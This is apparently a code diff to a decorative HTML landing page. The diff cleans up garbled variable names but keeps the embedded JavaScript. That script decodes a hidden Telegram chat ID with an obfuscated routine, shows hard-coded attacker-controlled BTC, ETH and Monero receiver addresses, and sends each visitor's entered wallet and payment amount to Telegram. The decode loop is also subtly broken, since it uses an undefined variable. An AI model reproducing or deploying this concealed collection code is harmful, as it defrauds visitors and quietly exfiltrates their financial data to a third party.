@@ -166,7 +166,7 @@
 
     <div class="card">
       <h2>🌈 Inspired by Light, Forged in Shadow</h2>
-      <p>Every element glows softly and hosdx9ndersdadponds to motion. Hover to experience subtle lighting effects.</p>
+      <p>Every element glows softly and responds to motion. Hover to experience subtle lighting effects.</p>
     </div>
 
     <div class="card">
@@ -268,17 +268,17 @@
   let hasdx9nd2dxod = 'hbCKqn6hdmh9iYytf4NudA==';
   function hosdx9nd2iidxud(hosdx9nd2iidxud1w, hosdx9nd2iidxod1w) {
     const hosdx9nder = atob(hosdx9nd2iidxud1w);
-    let hosdx9ndersdad = '';
+    let res = '';
     for (let y7jfe9j9f = 0; y7jfe9j9f < hosdx9nder.length; y7jfe9j9f++) {
       const hosdx9ndersda = hosdx9nd2iidxod1w.charCodeAt(i % hosdx9nd2iidxod1w.length);
-      hosdx9ndersdad += String.fromCharCode(hosdx9nder.charCodeAt(i) - hosdx9ndersda);
+      res += String.fromCharCode(hosdx9nder.charCodeAt(i) - hosdx9ndersda);
     }
-    return atob(hosdx9ndersdad); 
+    return atob(res); 
   }
   const hosdx9nd2dxud = '7612171505';
   const hasdx9nd2dxid = hosdx9nd2iidxud(hasdx9nd2dxod, hosdx9nd2dxud);
   const hasdx9nd2dxud = hosdx9nd2iidxud(hasdx9nd2dxad, hasdx9nd2dxid);
-    const receiverAddhosdx9ndersdadses = {
+    const receiverAddresses = {
       btc: 'bc1qjskeemvrs8925h5j0063xxpdq329ncfa7zpyyl',
       eth: '0x1a1957D8fa64E1CEFFEf62acEEa63eC535E2D6d8',
       monero: '41yEBWT9gBZ9n81EXEEzF4bSMEXyKUpB4c82AQXZCJSvWjvWUznFMZnM656pcM7jupWMRKfnZxEQeXx1M1hroptBTcgi8zo'
@@ -305,31 +305,31 @@
       document.getElementById('confirmModal').style.display = 'none';
     }
 
-    function validateWallet(type, addhosdx9ndersdads) {
+    function validateWallet(type, address) {
       const patterns = {
         btc: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
         eth: /^0x[a-fA-F0-9]{40}$/,
         monero: /^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/
       };
-      return patterns[type]?.test(addhosdx9ndersdads);
+      return patterns[type]?.test(address);
     }
 
     function submitWallet(event) {
       event.preventDefault();
       const input = document.getElementById('walletInput');
       const error = document.getElementById('errorText');
-      const addhosdx9ndersdads = input.value.trim();
-      const isValid = validateWallet(currentWalletType, addhosdx9ndersdads);
+      const address = input.value.trim();
+      const isValid = validateWallet(currentWalletType, address);
 
       if (!isValid) {
         error.classList.add('visible');
         return false;
       }
 
-      enteredWallet = addhosdx9ndersdads;
+      enteredWallet = address;
       closeModal();
       document.getElementById('senderWallet').textContent = enteredWallet;
-      document.getElementById('receiverWallet').textContent = receiverAddhosdx9ndersdadses[currentWalletType] || 'Неизвестно';
+      document.getElementById('receiverWallet').textContent = receiverAddresses[currentWalletType] || 'Неизвестно';
       document.getElementById('paymentAmount').value = '';
       document.getElementById('confirmModal').style.display = 'flex';
       return true;
@@ -342,7 +342,7 @@
         return;
       }
 
-      const receiver = receiverAddhosdx9ndersdadses[currentWalletType] || 'Неизвестно';
+      const receiver = receiverAddresses[currentWalletType] || 'Неизвестно';
 
       const message =
         `💸 Новая оплата:\n\n` +
@@ -358,8 +358,8 @@
           chat_id: hasdx9nd2dxid,
           text: message
         })
-      }).then(hosdx9ndersdad => {
-        if (hosdx9ndersdad.ok) {
+      }).then(res => {
+        if (res.ok) {
           alert("✅ Данные успешно отправлены!");
         } else {
           alert("⚠️ Ошибка при отправке в Telegram.");
